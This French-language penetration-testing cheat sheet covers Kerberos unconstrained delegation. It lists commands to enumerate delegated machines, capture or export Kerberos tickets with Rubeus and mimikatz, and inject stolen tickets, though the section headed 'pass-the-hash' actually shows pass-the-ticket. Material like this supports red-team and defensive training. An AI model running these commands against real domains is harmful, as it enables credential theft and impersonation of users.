La délégation Kerberos permet à un service d'emprunter l'identité d'un utilisateur pour accéder à d'autres ressources sur le réseau.

L'**Unconstrained Delegation** (délégation sans contrainte) est la forme la plus ancienne et la plus dangereuse de délégation. Lorsqu'elle est activée sur une machine (ou un compte de service), le Contrôleur de Domaine (DC) fait une confiance aveugle à cette machine.

## Enumération

### Avec PowerView

```powershell
# Trouver les ordinateurs
Get-NetComputer -Unconstrained

# Trouver les utilisateurs (comptes de service potentiels)
Get-NetUser -Unconstrained
```

### Avec le module ActiveDirectory

```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description
```

### Avec NetExec

```bash
netexec ldap $ip -u $user -p $pass --trusted-to-delegate
```

### Avec ldapsearch

```bash
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

## Exploitation

### Récupérer un TGT

Via monitoring :

```powershell
.\Rubeus.exe monitor
```

Ou extraction d'un tgt déjà présent, avec mimikatz par exemple :

```powershell
sekurlsa::tickets /export
```

## Pass-the-hash

```powershell
# Avec Rubeus (depuis base64 ou fichier)
.\Rubeus.exe ptt /ticket:doIFujCCBba...
.\Rubeus.exe ptt /ticket:ticket_leticket.kirbi

# Avec Mimikatz
mimikatz # kerberos::ptt ticket_leticket.kirbi
```

